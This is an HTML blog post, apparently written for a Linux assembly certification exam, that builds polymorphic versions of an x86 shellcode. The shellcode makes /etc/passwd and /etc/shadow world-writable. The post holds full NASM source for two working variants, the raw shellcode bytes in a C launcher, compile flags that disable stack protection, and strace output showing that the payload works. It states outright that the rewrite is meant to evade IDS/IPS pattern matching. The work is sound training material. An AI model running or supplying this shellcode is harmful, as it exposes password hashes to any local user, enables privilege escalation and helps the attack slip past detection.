@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>SLAE x86 Exam - Assignment #6 Part 1</title>
+    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
+    <link rel="canonical" href="/22/01/04/slae32-assignment-6_1">
+    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />
+
+    <style>
+         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
+    </style>
+</head>
+
+  <body>
+    <!--- Header and nav template site-wide -->
+<header>
+    <a href="/">RBCT</a>
+
+    <nav class="group">
+        
+            
+        
+            
+                
+                <a href="/">POSTS</a>
+                
+            
+        
+            
+                
+                <a href="/about/">ABOUT</a>
+                
+            
+        
+    </nav>
+</header>
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <h1>SLAE x86 Exam - Assignment #6 Part 1</h1>
+
+        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
+            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
+            <span class="mono authors">
+                <a href="/author/rbct" itemprop="name">rbct</a>
+            </span>
+        </div>
+
+        <time class="mono" datetime="2022-01-04T00:00:00+01:00" itemProp="datePublished">
+            4 January 2022
+        </time>
+
+        <hr>
+        <main itemprop="articleBody" style="position: relative;">
+            <h2 id="disclaimer">Disclaimer</h2>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: PA-30398</p>
+<h2 id="foreword">Foreword</h2>
+<p>The 6th assignment requires you to analyze 3 shellcodes from <a href="http://shell-storm.org/shellcode/">Shell-Storm</a> and &quot;create polymorphic versions of them to beat pattern matching&quot;.</p>
+<p>There's only 1 constraint:</p>
+<blockquote>
+<p>The polymorphic versions cannot be larger 150% of the existing shellcode</p>
+</blockquote>
+<p>I chose the following shellcodes:</p>
+<ol>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-222.php">Linux/x86 - setuid(0) setgid(0) execve(echo 0 &gt; /proc/sys/kernel/randomize_va_space) - 79 bytes</a></li>
+<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
+</ol>
+<p>In this part I'll create a polymorphic version of the 1st shellcode.</p>
+<h2 id="source-code">Source code</h2>
+<p>The files for this part of the assignment are the following:</p>
+<ul>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/original_shellcode.nasm">original_shellcode.nasm</a>, contains the original shellcode of which I wrote a polymorphic version</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_stable.nasm">polymorphic_stable.nasm</a>, contains the polymorphic version of the shellcode, but with a few more checks in order to avoid segmentation faults</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_tiny.nasm">polymorphic_tiny.nasm</a></li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/test_polymorphic_stable.c">test_polymorphic_stable.c</a>, a C program for testing the polymorphic shellcode (<code>polymorphic_stable.nasm</code>)</li>
+</ul>
+<h2 id="definitions">Definitions</h2>
+<blockquote>
+<p>What is <strong>Polymorphism</strong>?</p>
+</blockquote>
+<p>Polymorphism refers to the ability of something (e.g. shellcode, malwares) to mutate, while keeping intact the original code. For example, to clear a register you can use the following instruction:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>However, there are many more possibilities, like these:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; mov-xor</span>
+<span class="nf">mov</span> <span class="nb">EAX</span><span class="p">,</span> <span class="mh">0xffffffff</span>
+<span class="nf">xor</span> <span class="nb">EAX</span><span class="p">,</span> <span class="mh">0xffffffff</span>
+
+<span class="c1">; push-dec-pop</span>
+<span class="nf">push</span> <span class="mh">0x1</span>
+<span class="nf">pop</span> <span class="nb">EAX</span>
+<span class="nf">dec</span> <span class="nb">EAX</span>
+
+<span class="c1">; mov-sub</span>
+<span class="nf">mov</span> <span class="nb">EAX</span><span class="p">,</span> <span class="mh">0xaabbccdd</span>
+<span class="nf">sub</span> <span class="nb">EAX</span><span class="p">,</span> <span class="mh">0xaabbccdd</span>
+</code></pre></div></div>
+<p>In the case of shellcodes and malwares, the objective is to hide their presence from Security Protections that use <strong>Pattern Matching</strong>, such as <code>IDS</code> and <code>IPS</code> systems.</p>
+<h2 id="analysis">Analysis</h2>
+<p>First, here's the original shellcode in <strong>Intel syntax</strong>, since the shellcode on the original page uses <strong>AT&amp;T syntax</strong>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span> <span class="o">&gt;</span> shellcode.bin
+
+ndisasm <span class="nt">-b</span> 32 <span class="nt">-p</span> intel shellcode.bin
+</code></pre></div></div>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; EAX 0</span>
+<span class="err">00000000</span>  <span class="err">31</span><span class="nf">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+
+                            <span class="c1">; ECX = 110110110</span>
+                            <span class="c1">; u=rw, g=rw, o=rw</span>
+<span class="err">00000002</span>  <span class="err">66</span><span class="nf">B9B601</span>          <span class="nv">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mh">0x1b6</span>
+
+                            <span class="c1">; "/etc//passwd"</span>
+<span class="err">00000006</span>  <span class="err">50</span>                <span class="nf">push</span> <span class="nb">eax</span>
+<span class="err">00000007</span>  <span class="err">6873737764</span>        <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x64777373</span>
+<span class="err">0000000</span><span class="nf">C</span>  <span class="mi">682</span><span class="nv">F2F7061</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x61702f2f</span>
+<span class="err">00000011</span>  <span class="err">682</span><span class="nf">F657463</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x6374652f</span>
+
+                            <span class="c1">; EBX = pointer to "/etc//passwd"</span>
+<span class="err">00000016</span>  <span class="err">89</span><span class="nf">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; chmod(EBX, ECX)</span>
+                            <span class="c1">; ECX = permissions u=rw, g=rw, o=rw</span>
+<span class="err">00000018</span>  <span class="nf">B00F</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xf</span>
+<span class="err">0000001</span><span class="nf">A</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p><sub class='aside'>First it runs the instruction <code>chmod(&quot;/etc//passwd&quot;, 0666)</code> to change the permissions over <code>/etc/passwd</code>
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; EAX = 0</span>
+<span class="err">0000001</span><span class="nf">C</span>  <span class="mi">31</span><span class="nv">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+<span class="err">0000001</span><span class="nf">E</span>  <span class="mi">50</span>                <span class="nv">push</span> <span class="nb">eax</span>
+
+                            <span class="c1">; "/etc//shadow"</span>
+<span class="err">0000001</span><span class="nf">F</span>  <span class="mi">6861646</span><span class="nv">F77</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x776f6461</span>
+<span class="err">00000024</span>  <span class="err">682</span><span class="nf">F2F7368</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x68732f2f</span>
+<span class="err">00000029</span>  <span class="err">682</span><span class="nf">F657463</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x6374652f</span>
+
+                            <span class="c1">; EBX = pointer to "/etc//shadow"</span>
+<span class="err">0000002</span><span class="nf">E</span>  <span class="mi">89</span><span class="nv">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; call chmod(EBX, ECX)</span>
+                            <span class="c1">; ECX = permissions u=rw, g=rw, o=rw</span>
+<span class="err">00000030</span>  <span class="nf">B00F</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xf</span>
+<span class="err">00000032</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p><sub class='aside'>After that it runs the instruction <code>chmod(&quot;/etc//shadow&quot;, 0666)</code> to change the permissions over <code>/etc/shadow</code>
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; call exit syscall</span>
+<span class="err">00000034</span>  <span class="err">31</span><span class="nf">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
+<span class="err">00000036</span>  <span class="err">40</span>                <span class="nf">inc</span> <span class="nb">eax</span>
+<span class="err">00000037</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p><sub class='aside'>Finally it exits using <code>exit(EBX)</code>
+</sub></p>
+<p>It translates into the following C program:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/stat.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+  <span class="n">chmod</span><span class="p">(</span><span class="s">"/etc//passwd"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
+  <span class="n">chmod</span><span class="p">(</span><span class="s">"/etc//shadow"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
+
+  <span class="c1">// EBX is equal to ESP, so it's just a random exit code</span>
+  <span class="n">exit</span><span class="p">(</span><span class="n">EBX</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It changes the permissions on the files <code>/etc/passwd</code> and <code>/etc/shadow</code> to <code>0666</code>. After that, it uses the <code>exit</code> syscall to terminate its own execution.</p>
+<h2 id="polymorphic-version">Polymorphic version</h2>
+<h3 id="focus-on-size">Focus on size</h3>
+<p>Follows the smallest version I managed to write:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Author: Robert C. Raducioiu (rbct)</span>
+
+<span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+
+    <span class="c1">; clear ECX, EAX, EDX</span>
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+    <span class="nf">mul</span> <span class="nb">ecx</span>
+
+    <span class="c1">; store "/etc" into ESI</span>
+    <span class="c1">;   this allows me to reuse this value for the second call to chmod</span>
+    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0x6374652f</span>
+
+    <span class="c1">; add a NULL byte (in this case a NULL DWORD) at the end of the string</span>
+    <span class="c1">;   pushed to the stack</span>
+    <span class="nf">push</span> <span class="nb">eax</span>
+
+    <span class="c1">; store the string "/etc//shadow" on the stack</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x776f6461</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x68732f2f</span>
+    <span class="nf">push</span> <span class="nb">esi</span>
+</code></pre></div></div>
+<p><sub class='aside'>Remember that when you push a string to the stack, the bytes must be <strong>reversed</strong>, as <strong>the stack grows downward</strong>
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; 1st argument of chmod(): const char *pathname</span>
+    <span class="c1">; store into EBX the pointer to "/etc//shadow"</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+
+    <span class="c1">; set EAX to 0x0000000f -&gt; chmod() syscall</span>
+    <span class="nf">add</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf</span>
+
+    <span class="c1">; 2nd argument of chmod(): mode_t mode</span>
+    <span class="c1">; in this case ECX is set to the binary value 110110110</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mh">0x1b6</span>
+
+    <span class="c1">; call chmod()</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+    <span class="c1">; set EAX to 0 and push it to the stack;</span>
+    <span class="c1">; like before, it acts as the string terminator</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>
+    <span class="nf">push</span> <span class="nb">eax</span>
+
+    <span class="c1">; push "/etc//passwd" to the stack</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x64777373</span>
+
+    <span class="c1">; also set EAX to 0x0000000f -&gt; chmod() syscall</span>
+    <span class="nf">add</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf</span>
+    <span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x61702f2f</span>
+
+    <span class="c1">; reuse the value of "/etc" from before</span>
+    <span class="nf">push</span> <span class="nb">esi</span>
+    
+    <span class="c1">; 1st argument of chmod(): const char *pathname</span>
+    <span class="c1">; store into EBX the pointer to "/etc//passwd"</span>
+    <span class="nf">push</span> <span class="nb">esp</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>
+
+    <span class="c1">; call chmod()</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+
+    <span class="c1">; invoke the exit syscall</span>
+    <span class="c1">; exit code is set to ESP, but it's not important</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>
+    <span class="nf">inc</span> <span class="nb">eax</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>The original shellcode uses <code>57</code> bytes, while this one uses <code>52</code> bytes:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objcopy <span class="nt">-O</span> binary <span class="nt">-j</span> .text ./shellcode.o /dev/stdout | <span class="nb">wc</span> <span class="nt">-c</span>
+
+<span class="c"># 52</span>
+</code></pre></div></div>
+<p>Although, I managed to make it smaller, it requires one <strong>condition</strong>:</p>
+<ul>
+<li>the call to <code>chmod</code> MUST be successful, hence store <code>0</code> into <code>EAX</code></li>
+</ul>
+<p>If the register <code>EAX</code> isn't set to 0, then the next call will throw a <code>SIGSEGV</code> signal, so the program will crash.</p>
+<h3 id="focus-on-stability">Focus on stability</h3>
+<p>For this reason, I also wrote a slightly different version that handles this case, not the SIGSEGV error but clearing the EAX register:</p>
+<div class="language-patch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- polymorphic_tiny.nasm       2022-01-12 07:54:18.947129214 +0000
+</span><span class="gi">+++ polymorphic_stable.nasm     2022-01-12 07:53:52.437239057 +0000
+</span><span class="p">@@ -37,7 +37,9 @@</span>
+     ; call chmod()
+     int 0x80
+ 
+<span class="gi">+    ; set EAX to 0 and push it to the stack;
+</span>     ; like before, it acts as the string terminator
+<span class="gi">+    mov eax, edx
+</span>     push eax
+ 
+     ; push "/etc//passwd" to the stack
+<span class="p">@@ -60,5 +62,6 @@</span>
+ 
+     ; invoke the exit syscall
+     ; exit code is set to ESP, but it's not important
+<span class="gi">+    mov eax, edx
+</span>     inc eax
+     int 0x80
+</code></pre></div></div>
+<p>Since I used the instruction <code>mul ecx</code> at the beginning, it means <code>EDX</code> and <code>EAX</code> are set to 0. Moreover, given <code>EDX</code> is never used, it means I could use it to clear other registers.</p>
+<p>In this case I repeated two times the following instruction:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edx</span>
+</code></pre></div></div>
+<p>Although not very small, at <code>56</code> bytes, this stable polymorphic version is still smaller than the original shellcode.</p>
+<h3 id="testing">Testing</h3>
+<p>To test the polymorphic shellcode, I've used the following C program:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x31\xc9\xf7\xe1\xbe\x2f\x65\x74\x63\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x56\x89\xe3\x04\x0f\x66\xb9\xb6\x01\xcd\x80\x89\xd0\x50\x68\x73\x73\x77\x64\x04\x0f\x68\x2f\x2f\x70\x61\x56\x54\x5b\xcd\x80\x89\xd0\x40\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
+
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
+    <span class="n">ret</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>To compile:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-o</span> test_polymorphic_shellcode test_polymorphic_shellcode.c
+</code></pre></div></div>
+<p>Once I've run it, I could confirm it executes changes the permissions over <code>/etc/passwd</code> and <code>/etc/shadow</code> successfully:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbct@slae:~/exam/assignment_6/1<span class="nv">$ </span><span class="nb">sudo </span>strace <span class="nt">-e</span> <span class="nv">trace</span><span class="o">=</span><span class="nb">chmod</span> ./test_polymorphic_shellcode 
+<span class="c"># Shellcode length: 56</span>
+<span class="c"># chmod("/etc//shadow", 0666)             = 0</span>
+<span class="c"># chmod("/etc//passwd", 0666)             = 0</span>
+
+rbct@slae:~/exam/assignment_6/1<span class="err">$</span>
+</code></pre></div></div>
+<p>As you can see, <code>chmod</code> returned the value <code>0</code> in both cases, which means it managed to change the permissions and exit gracefully.</p>
+
+
+            <footer class="tags">
+                <section class="mono tags">
+                    Tagged
+
+                    
+                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/x86/">x86</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/shellcode/">shellcode</a>, <a href="/tags#/tags/polymorphism/">polymorphism</a>
+                </section><section class="pagination">
+                        <a href="/22/01/04/slae32-assignment-6_2">
+                            <div class="mono">NEXT</div>
+                            SLAE x86 Exam - Assignment #6 Part 2
+                        </a>
+                    </section><section class="pagination">
+                        <a href="/21/12/25/slae32-assignment-5_4">
+                            <div class="mono">PREVIOUS</div>
+                            SLAE x86 Exam - Assignment #5 Part 4
+                        </a>
+                    </section></footer>
+        </main>
+    </article>
+  </body>
+</html>
